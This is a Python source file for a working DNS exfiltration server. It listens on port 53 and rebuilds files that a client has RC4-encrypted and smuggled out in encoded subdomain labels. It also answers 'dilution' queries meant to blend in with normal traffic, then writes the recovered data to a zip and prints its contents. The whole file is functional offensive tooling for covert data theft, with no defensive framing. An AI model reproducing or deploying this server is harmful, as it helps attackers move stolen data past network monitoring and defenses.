#!/usr/bin/python
# -*- coding: utf8 -*-

import math
import statistics
import sys
import argparse
import socket
from dnslib import *
from base64 import b64decode, b32decode
import os
import zipfile
import random
import traceback
import tldextract
PSL_EXTRACT = tldextract.TLDExtract(suffix_list_urls=(), cache_dir=None, include_psl_private_domains=False)  # keep in sync with feature_extraction._EXTRACT

# ======================================================================================================
# RC4 CLASS (with state maintained between calls)
# ======================================================================================================
class RC4:
    def __init__(self, key=None):
        self.state = list(range(256))
        self.x = 0
        self.y = 0
        if key is not None:
            self.key = key
            self.init(key)

    def init(self, key):
        # Standard RC4 Key-Scheduling Algorithm (KSA) - matches client
        j = 0
        for i in range(256):
            j = (j + self.state[i] + ord(key[i % len(key)])) & 0xFF
            self.state[i], self.state[j] = self.state[j], self.state[i]
        self.x = 0
        self.y = 0

    def binaryDecrypt(self, data):
        output = [None] * len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)

# ======================================================================================================
# HELPER FUNCTIONS
# ======================================================================================================


def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))
    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[%s] %s%s\t%s\t\r' % (bar, percents, '%', status))



def fromBase32Map(msg):
    """Decode base32map-encoded message (word format)."""
    clean_msg = msg.replace('.', '')
    base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
    word_map = [
        "kit", "van", "web", "you", "for", "set", "big", "fin",
        "sly", "app", "get", "hot", "mix", "dug", "ace", "arm",
        "era", "red", "led", "not", "hut", "car", "pen", "man",
        "she", "all", "sin", "leo", "sir", "run", "cut", "chi"
    ]

    base32_string = ''
    index = 0
    while index < len(clean_msg):
        word = clean_msg[index:index+3]
        if word in word_map:
            word_index = word_map.index(word)
            base32_string += base32Alphabet[word_index]
        else:
            raise ValueError(f"Invalid base32map word: {word}")
        index += 3

    return fromBase32(base32_string)



def fromBase32(string):
    """Decode standard Base32 string."""
    mod = len(string) % 8
    padding = {2: "======", 4: "====", 5: "===", 7: "="}.get(mod, "")
    return b32decode(string.upper() + padding)





def fromHex(string):
    """Decode hexadecimal string."""
    return bytes.fromhex(string)



def color(string, color=None):
    """Change text color for the Linux terminal."""
    attr = ['1']
    if color:
        if color.lower() == "red": attr.append('31')
        elif color.lower() == "green": attr.append('32')
        elif color.lower() == "blue": attr.append('34')
    else:
        if string.strip().startswith("[!"): attr.append('31')
        elif string.strip().startswith("[+"): attr.append('32')
        elif string.strip().startswith("[?"): attr.append('33')
        elif string.strip().startswith("[*"): attr.append('34')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)



def entropy(text):
    prob = [float(text.count(c)) / len(text) for c in dict.fromkeys(list(text))]
    return - sum([p * math.log(p) / math.log(2.0) for p in prob])


# ======================================================================================================
# MAIN FUNCTION
# ======================================================================================================

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DNS Exfiltration Server')
    parser.add_argument("-f", "--domain-file", help=".txt file of domains used to exfiltrate data (one each line)",
                        dest="domainFile", required=True)
    parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data",
                        dest="password", required=True)
    parser.add_argument("-o", "--output", help="The name of the resulting file",
                        dest="outputFileName", required=True)
    args = parser.parse_args()

    entropies = []
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))

    domains = []
    with open(args.domainFile, 'r') as f:
        domains = [line.strip().rstrip('.').lower() for line in f if line.strip()]

    print(color("[*] DNS Exfiltration Server"))
    print(color("[*] Listening on port 53"))
    print(color(f"[*] Domains: {domains}"))
    print(color("[*] Supported encodings: base32map (0), base32 (1), hex (2)"))

    try:
        requestIndex = 0
        fileData = bytearray()
        encoding_type = None
        totalFileSize = 0
        initBuffer = ''
        init_complete = False
        processed_seqs = set()  # Track already-processed sequence numbers for retry handling

        base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

        map_words = ["kit", "van", "web", "you", "for", "set", "big", "fin",
                     "sly", "app", "get", "hot", "mix", "dug", "ace", "arm",
                     "era", "red", "led", "not", "hut", "car", "pen", "man",
                     "she", "all", "sin", "leo", "sir", "run", "cut", "chi"]

        encoding_map = {
            '0': 'base32map',
            '1': 'base32',
            '2': 'hex'
        }

        # Initialize RC4 once with pre-shared password
        rc4Decryptor = RC4(args.password)

        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)

            print(color("[+] Received query: [{}] - Type: [{}]".format(
                request.q.qname, request.q.qtype)))

            if request.q.qtype == 1:
                qname = str(request.q.qname)
                # Case is kept in the labels (payload); only the eTLD+1 key is lowercased.
                extracted = PSL_EXTRACT(qname.rstrip('.'))
                registered = f"{extracted.domain}.{extracted.suffix}".lower() if extracted.domain and extracted.suffix else ""
                subdomain = extracted.subdomain
                labels = subdomain.split('.') if subdomain else []

                if registered not in domains:
                    print(color(f'[!] Domain {registered} not in allowed list, ignoring'))
                    continue

                # Single label: INIT (before complete) or DILUTION (after complete)
                if len(labels) == 1:
                    if not init_complete:
                        print(color('[*] Detected INIT request'))
                        initBuffer += labels[0]
                        print(color(f'[*] Init buffer: {initBuffer} ({len(initBuffer)} chars)'))
                        
                        # Try to decode and validate init buffer after each chunk
                        try:
                            decoded_bytes = fromBase32Map(initBuffer)
                            msg = decoded_bytes.decode('utf-8')
                            # "<encoding>|<file size>|": only the trailing '|' marks the
                            # init as complete; a prefix like "1|303" of "1|3030|" is not.
                            parts = msg.split('|')
                            if len(parts) == 3 and parts[2] == '' and parts[1].isdigit():
                                encoding_num, fileSize_str = parts[0], parts[1]
                                totalFileSize = int(fileSize_str)
                                if encoding_num in encoding_map:
                                    encoding_type = encoding_map[encoding_num]
                                    print(color(f"[+] Init complete: {msg}"))
                                    print(color(f"[+] Encoding: {encoding_type} ({encoding_num})"))
                                    print(color(f"[+] File size: {totalFileSize} bytes"))
                                    fileData = bytearray()
                                    requestIndex = 0
                                    entropies = []
                                    initBuffer = ''
                                    init_complete = True
                                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                                    reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{requestIndex % 256}"), ttl=60))
                                    udps.sendto(reply.pack(), addr)
                                    continue
                        except Exception as e:
                            pass
                        
                        # Init not yet complete
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), ttl=60))
                        udps.sendto(reply.pack(), addr)
                        print(color("[*] Init not complete, waiting for more..."))
                        continue
                    
                    else:
                        # Single label after init complete = DILUTION
                        print(color("[*] Received Dilution query..."))
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), ttl=60))
                        udps.sendto(reply.pack(), addr)
                        continue

                # Multi-label (2+) = DATA
                if len(labels) >= 2:
                    if encoding_type is None:
                        print(color("[!] Error: Received data before init"))
                        continue

                    seq_number = int(labels[0])  # First label = sequence number (plaintext)
                    rawData = '.'.join(labels[1:])  # Remaining labels = encoded data
                    
                    print(color(f"[*] Received DATA: seq={seq_number}, data={rawData[:20]}..."))

                    # FIX for B3-CHK-001: Enforce label length limit (DNS max 63 chars per label)
                    if len(rawData) > 63:
                        print(color(f"[!] Label too long ({len(rawData)} chars), skipping"))
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{requestIndex % 256}"), ttl=60))
                        udps.sendto(reply.pack(), addr)
                        continue
                    
                    # FIX for B4-RETRY-004: Track processed sequence numbers
                    # Accept current, previous, or any already-processed (retry)
                    expected_seq_number = requestIndex % 256

                    if seq_number == expected_seq_number:
                        # New chunk: decode, decrypt and append. Only new chunks are
                        # decrypted: the client encrypts each chunk once and resends
                        # the same bytes on a retry, so decrypting a duplicate (client
                        # retry, dig or resolver retransmission) would advance the RC4
                        # keystream past the client's and corrupt every later chunk.
                        currentEntropy = entropy(rawData)
                        entropies.append(currentEntropy)

                        # Decode based on encoding type
                        if encoding_type == 'base32':
                            decoded = fromBase32(rawData)
                        elif encoding_type == 'hex':
                            decoded = fromHex(rawData)
                        else:  # base32map
                            base32_string = ''
                            index = 0
                            while index < len(rawData):
                                word = rawData[index:index+3]
                                if word in map_words:
                                    base32_string += base32Alphabet[map_words.index(word)]
                                index += 3
                            mod = len(base32_string) % 8
                            padding = {2: "======", 4: "====", 5: "===", 7: "="}.get(mod, "")
                            decoded = b32decode(base32_string + padding)

                        # Decrypt - RC4 maintains state between calls
                        decrypted = rc4Decryptor.binaryDecrypt(decoded)

                        if len(decrypted) < 1:
                            print(color("[!] Decrypted chunk too short"))
                            continue

                        # Sequence number is from label (plaintext), decrypted data is pure payload
                        fileData.extend(decrypted)
                        requestIndex += 1
                        processed_seqs.add(seq_number)
                    elif seq_number in processed_seqs:
                        # Retry of already-processed request - resend ACK
                        print(color(f"[*] Retry detected: seq {seq_number} (already processed)"))
                    elif seq_number == (expected_seq_number - 1) % 256:
                        # Retry of immediate previous - resend ACK (should not happen with proper tracking)
                        print(color(f"[*] Retry detected: seq {seq_number} (previous)"))
                    else:
                        print(color(f"[!] Out of order: expected {expected_seq_number}, got {seq_number}"))
                        continue

                    # Send ACK with sequence number
                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{seq_number}")))
                    udps.sendto(reply.pack(), addr)
                    progress(len(fileData), totalFileSize, "Receiving")

                    # All data received when we have totalFileSize bytes
                    if len(fileData) >= totalFileSize:
                        print(color('\n[+] All data received!'))
                        print(color(f'[*] Average entropy: {statistics.mean(entropies):.2f}'))

                        try:
                            args.outputFileName = args.outputFileName + ".zip"
                            print(color("[+] Saving to [{}]".format(args.outputFileName)))

                            with open(args.outputFileName, 'wb') as f:
                                f.write(bytes(fileData))

                            print(color("[+] File saved successfully"))

                            if zipfile.is_zipfile(args.outputFileName):
                                print(color('[+] Extracting ZIP content:'))
                                with zipfile.ZipFile(args.outputFileName) as z:
                                    for filename in z.namelist():
                                        print(color(f'[*] File in ZIP: {filename}'))
                                        if not os.path.isdir(filename):
                                            with z.open(filename) as f:
                                                content_preview = f.read()[:500]
                                                try:
                                                    print(content_preview.decode('utf-8', errors='ignore'))
                                                except:
                                                    print(f"[Binary file, size: {len(content_preview)} bytes]")
                            else:
                                print(color("[!] Warning: Not a valid ZIP file"))

                        except Exception as e:
                            print(color(f"[!] Error: {str(e)}"))
                            traceback.print_exc()

                        # Reset for next file
                        encoding_type = None
                        fileData = bytearray()
                        requestIndex = 0
                        init_complete = False
                        initBuffer = ''
                        processed_seqs = set()
                        continue

    except KeyboardInterrupt:
        pass
    finally:
        print(color("\n[!] Stopping DNS Server"))
        udps.close()
